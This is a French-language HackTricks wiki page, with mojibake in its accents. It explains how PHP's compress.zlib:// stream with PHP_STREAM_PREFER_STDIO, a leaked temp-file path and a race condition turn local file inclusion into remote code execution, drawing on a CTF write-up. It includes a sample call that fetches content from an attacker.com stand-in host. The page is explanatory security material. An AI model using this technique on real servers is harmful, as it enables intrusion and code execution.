# LFI2RCE Via compress.zlib + PHP\_STREAM\_PREFER\_STUDIO + Path Disclosure

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

#### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) est un moteur de recherche aliment√© par le **dark-web** qui offre des fonctionnalit√©s **gratuites** pour v√©rifier si une entreprise ou ses clients ont √©t√© **compromis** par des **malwares voleurs**.

Leur objectif principal avec WhiteIntel est de lutter contre les prises de contr√¥le de comptes et les attaques par ransomware r√©sultant de malwares de vol d'informations.

Vous pouvez consulter leur site web et essayer leur moteur **gratuitement** √† :

{% embed url="https://whiteintel.io" %}

***

### `compress.zlib://` et `PHP_STREAM_PREFER_STDIO`

Un fichier ouvert en utilisant le protocole `compress.zlib://` avec le drapeau `PHP_STREAM_PREFER_STDIO` peut continuer √† √©crire des donn√©es qui arrivent √† la connexion plus tard dans le m√™me fichier.

Cela signifie qu'un appel tel que :
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Enverra une requ√™te demandant http://attacker.com/file, puis le serveur pourrait r√©pondre √† la requ√™te avec une r√©ponse HTTP valide, garder la connexion ouverte et envoyer des donn√©es suppl√©mentaires quelque temps plus tard qui seront √©galement √©crites dans le fichier.

Vous pouvez voir cette information dans cette partie du code php-src dans main/streams/cast.c :
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### Condition de course pour RCE

[**Ce CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) a √©t√© r√©solu en utilisant le truc pr√©c√©dent.

L'attaquant fera en sorte que le **serveur victime ouvre une connexion en lisant un fichier depuis le serveur de l'attaquant** en utilisant le protocole **`compress.zlib`**.

**Pendant** que cette **connexion** existe, l'attaquant **exfiltrera le chemin** vers le fichier temporaire cr√©√© (il est divulgu√© par le serveur).

**Tant que** la **connexion** est encore ouverte, l'attaquant **exploite un LFI en chargeant le fichier temporaire** qu'il contr√¥le.

Cependant, il y a une v√©rification dans le serveur web qui **emp√™che le chargement de fichiers contenant `<?`**. Par cons√©quent, l'attaquant abusent d'une **Condition de course**. Dans la connexion qui est encore ouverte, l'**attaquant** **enverra la charge utile PHP APR√àS** que le **serveur web** ait **v√©rifi√©** si le fichier contient les caract√®res interdits mais **AVANT qu'il ne charge son contenu**.

Pour plus d'informations, consultez la description de la Condition de course et le CTF dans [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)

#### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) est un moteur de recherche aliment√© par le **dark-web** qui offre des fonctionnalit√©s **gratuites** pour v√©rifier si une entreprise ou ses clients ont √©t√© **compromis** par des **malwares voleurs**.

Leur objectif principal avec WhiteIntel est de lutter contre les prises de contr√¥le de comptes et les attaques par ransomware r√©sultant de malwares de vol d'informations.

Vous pouvez consulter leur site web et essayer leur moteur **gratuitement** √† :

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
